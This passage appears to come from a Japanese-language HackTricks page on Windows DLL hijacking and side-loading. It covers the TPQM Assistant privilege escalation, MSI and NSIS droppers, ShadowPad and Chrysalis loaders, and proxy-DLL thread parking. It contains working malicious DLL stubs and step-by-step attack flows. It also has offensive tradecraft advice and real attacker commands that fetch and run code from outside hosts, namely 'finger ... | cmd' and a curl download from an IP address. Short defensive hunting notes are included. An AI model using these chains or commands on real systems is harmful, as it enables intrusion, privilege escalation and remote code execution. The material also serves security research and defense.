攻撃者は同じディレクトリに悪意のある `hostfxr.dll` のスタブを配置し、missing DLL を悪用してユーザーのコンテキストで code execution を実現できます:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. 標準ユーザーとして `hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置します。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前9時30分に実行されるまで待ちます。
3. タスクの実行時に管理者がログインしている場合、悪意のある DLL は中程度の整合性レベルで管理者のセッション内で実行されます。
4. 標準的な UAC bypass techniques を連鎖させ、中程度の整合性レベルから SYSTEM 権限へ昇格します。

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors は、信頼された署名済みプロセス上で payloads を実行するために、MSI-based droppers と DLL side-loading を頻繁に組み合わせます。<sup>[[10]](#references)</sup>

Chain overview
- ユーザーが MSI をダウンロードします。GUI インストール中に CustomAction（LaunchApplication や VBScript action など）がサイレントに実行され、埋め込み resources から次の stage を再構築します。
- Dropper は、正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込みます（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名済み EXE が起動されると、Windows DLL search order により、まず working directory から wsc.dll がロードされ、署名済み parent の下で attacker code が実行されます（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction table:
- executable や VBScript を実行する entries を探します。Suspicious pattern の例: LaunchApplication が embedded file を background で実行する。
- Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary tables を調査します。
- MSI CAB 内の embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- または lessmsi を使用します: lessmsi x package.msi C:\out
- VBScript CustomAction によって連結および復号される、複数の小さな fragments を探します。Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- これら2つのファイルを同じフォルダーに配置します：
- wsc_proxy.exe：正規の署名付き host（Avast）。このプロセスは、ディレクトリ内から名前で wsc.dll の読み込みを試みます。
- wsc.dll：attacker DLL。特定の exports が不要な場合は DllMain で十分です。それ以外の場合は proxy DLL をビルドし、DllMain で payload を実行しながら必要な exports を genuine library に転送します。
- 最小限の DLL payload をビルドします：
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- export要件には、proxying framework（例: DLLirant/Spartacus）を使用して、payloadも実行するforwarding DLLを生成します。

- このtechniqueは、host binaryによるDLL name resolutionに依存します。hostがabsolute pathやsafe loading flag（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijackは失敗する可能性があります。
- KnownDLLs、SxS、forwarded exportsは優先順位に影響するため、host binaryとexport setの選定時に考慮する必要があります。

## Signed triads + encrypted payloads (ShadowPad case study)

Check Pointは、Ink Dragonがディスク上でcore payloadをencryptedのまま維持しつつ、legitimate softwareに紛れ込ませるため、**three-file triad**を使用してShadowPadをdeployする方法を説明しています。<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD、Realtek、NVIDIAなどのvendorがabuseされます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者はWindows binaryに見えるようexecutableの名前を変更します（例: `conhost.exe`）が、Authenticode signatureは有効なままです。
2. **Malicious loader DLL** – EXEの隣にexpected nameでdropされます（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。DLLは通常、ScatterBrain frameworkでobfuscateされたMFC binaryであり、encrypted blobを見つけてdecryptし、ShadowPadをreflectively mapすることだけが役割です。
3. **Encrypted payload blob** – 同じdirectory内に`<name>.tmp`として保存されることが多くあります。decrypted payloadをmemory-mapした後、loaderはTMP fileをdeleteしてforensic evidenceを破壊します。

Tradecraft notes:

* signed EXEの名前を変更し（PE header内の元の`OriginalFileName`は維持）、Windows binaryを装いながらvendor signatureを保持できます。そのため、Ink Dragonの手法を再現する場合は、実際にはAMD/NVIDIA utilityである`conhost.exe`風binaryをdropします。
* executableはtrustedのままなので、ほとんどのallowlisting controlでは、malicious DLLをその隣に配置するだけで済みます。signed parentは通常そのまま実行できるため、loader DLLのcustomizationに重点を置きます。
* ShadowPadのdecryptorは、TMP blobがloaderの隣にあり、mapping後にfileをzeroできるようwritableであることを想定しています。payloadがloadされるまでdirectoryをwritableに保ちます。memory内に入った後は、OPSECのためTMP fileを安全にdeleteできます。

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

OperatorsはDLL sideloadingとLOLBASを組み合わせ、ディスク上のcustom artifactをtrusted EXEの隣に置くmalicious DLLだけにします。<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShellが`cmd.exe /c`をspawnし、Finger serverからcommandsを取得して`cmd`にpipeします。

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`はTCP/79のtextを取得し、`| cmd`はserver responseをexecuteします。これにより、operatorsはserver-sideでsecond stage serverをrotateできます。

- **Built-in download/extract:** benign extensionを付けたarchiveをdownloadし、unpackして、randomな`%LocalAppData%` folder下にsideload targetとDLLをstageします。

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L`はprogressを隠してredirectに従います。`tar -xf`はWindows built-in tarを使用します。

- **WMI/CIM launch:** WMI経由でEXEをstartし、colocated DLLをloadする間、telemetry上ではCIM-created processとして表示されるようにします。

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- local DLLを優先するbinary（例: `intelbq.exe`、`nearby_share.exe`）で動作します。payload（例: Remcos）はtrusted nameの下で実行されます。

- **Hunting:** `/p`、`/m`、`/c`が同時に現れる`forfiles`にalertします。admin script以外では一般的ではありません。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近のLotus Blossom intrusionでは、trusted update chainをabuseして、DLL sideloadと完全なin-memory payloadsをstageするNSIS-packed dropperをdeliverしました。<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe`（NSIS）は`%AppData%\Bluetooth`をcreateして**HIDDEN**にmarkし、名前を変更したBitdefender Submission Wizard `BluetoothService.exe`、malicious `log.dll`、encrypted blob `BluetoothService`をdropしてからEXEをlaunchします。
- host EXEは`log.dll`をimportし、`LogInit`/`LogWrite`をcallします。`LogInit`はblobをmmap-loadします。`LogWrite`はcustom LCG-based stream（constants **0x19660D** / **0x3C6EF35F**、key materialはprior hashからderive）でdecryptし、bufferをplaintext shellcodeでoverwriteしてtempをfreeし、shellcodeへjumpします。
- IATを避けるため、loaderはFNV-1a basis 0x811C9DC5 + prime 0x100019を使用してexport nameをhashし、その後Murmur-style avalanche（**0x85EBCA6B**）を適用してsalted target hashと比較します。

Main shellcode (Chrysalis)
- PE-like main moduleを、key `gQ2JR&9;`を使用したadd/XOR/subの反復によってfive passesでdecryptし、その後`Kernel32.dll` → `GetProcAddress`をdynamic loadしてimport resolutionを完了します。
- per-character bit-rotate/XOR transformによってruntimeでDLL name stringをreconstructし、その後`oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32`をloadします。
- second resolverは**PEB → InMemoryOrderModuleList**をwalkし、各export tableを4-byte block単位でMurmur-style mixingによってparseします。hashが見つからない場合のみ`GetProcAddress`へfallbackします。

Embedded configuration & C2
- configはdropされた`BluetoothService` fileの**offset 0x30808**（size **0x980**）にあり、key `qwhvb^435h&*7`でRC4-decryptされてC2 URLとUser-Agentを明らかにします。
- beaconはdot-delimited host profileをbuildし、tag `4Q`をprependしてから、key `vAuig34%^325hGV`でRC4-encryptし、HTTPS経由で`HttpSendRequestA`を実行します。responseはRC4-decryptされ、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）によってdispatchされます。
- execution modeはCLI argsでgateされます。argsなし = `-i`を指すpersistence（service/Run key）をinstall、`-i` = `-k`付きでselfをrelaunch、`-k` = installをskipしてpayloadをrunします。

Alternate loader observed
- 同じintrusionではTiny C Compilerもdropされ、`C:\ProgramData\USOShared\`から`svchost.exe -nostdlib -run conf.c`が実行され、隣には`libtcc.dll`が置かれていました。attackerが供給したC sourceにはshellcodeがembeddedされ、PEをディスクにtouchすることなくcompileされ、in-memoryでrunされました。以下で再現します。
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- この TCC-based compile-and-run stage は実行時に `Wininet.dll` を import し、hardcoded URL から second-stage shellcode を取得することで、compiler run を装う柔軟な loader となっていた。

## Signed-host sideloading with export proxying + host thread parking

一部の DLL sideloading chain では、malicious DLL の load 後に crash するのではなく、legitimate host が後続 stage を正常に load できるだけ長く存続するよう、**stability engineering** が追加される。<sup>[[11]](#references)</sup>

Observed pattern
- trusted EXE を malicious DLL と同じ場所に、`version.dll` のような想定される dependency name で配置する。
- malicious DLL は、想定されるすべての export を real system DLL（例: `%SystemRoot%\\System32\\version.dll`）へ **proxy** する。これにより import resolution が成功し続け、host process が動作し続ける。
- load 後、malicious DLL は **host entry point を patch** し、main thread が終了処理や process を terminate する code path を実行する代わりに、無限の `Sleep` loop に入るようにする。
- 新しい thread が実際の malicious work を実行する。具体的には、次の stage の DLL name または path を復号（RC4/XOR が一般的）し、その後 `LoadLibrary` で起動する。

Why this matters
- 通常の DLL proxying は API compatibility を維持するが、後続 stage のために host が十分長く存続することまでは保証しない。
- main thread を `Sleep(INFINITE)` で parking することは、loader が worker thread で復号、staging、または network bootstrap を実行している間、signed process を resident に保つ単純な方法である。
- suspicious な `DllMain` だけを hunting していると、host entry point が patch された後に興味深い behavior が発生し、secondary thread が開始されるこの pattern を見逃す可能性がある。

Minimal workflow
1. signed host EXE を copy し、local directory から resolve される DLL を特定する。
2. 同じ functions を export し、それらを legitimate DLL に forwarding する proxy DLL を build する。
3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を create する。
4. その thread から host entry point または main thread start routine を patch し、`Sleep` loop に入るようにする。
5. 次の stage の DLL name/config を復号し、`LoadLibrary` を呼び出すか、payload を manual-map する。

Defensive pivots
- `version.dll` または同様に一般的な library を `System32` ではなく、自身の application directory から load する signed process。
- image load の直後に process entry point へ行われる memory patch。特に、`Sleep`/`SleepEx` へ redirect される jumps/calls。
- proxy DLL によって create され、復号された name を持つ second DLL に対して直ちに `LoadLibrary` を呼び出す threads。
- `ProgramData`、`%TEMP%`、または unpacked archive paths のような writable staging directories 内で、vendor executables の隣に配置された full-export proxy DLL。

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe を使用した Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows における DLL hijacking。シンプルな C の例。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore が Europe を標的とする新たな Malware を展開](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks と Windows Helpers が出会うとき](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT を配布する進化する Impersonation Campaigns の構造](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Southeast Asian Government を標的とする Threat Clusters の分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Relay Network と Stealthy Offensive Operation の内部構造を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Lotus Blossom の toolkit の詳細分析](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens の 2026 Espionage Campaigns を追跡](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Iranian Conflict 中の Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 が Southeast Asian Governments と Critical Infrastructure を標的に](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
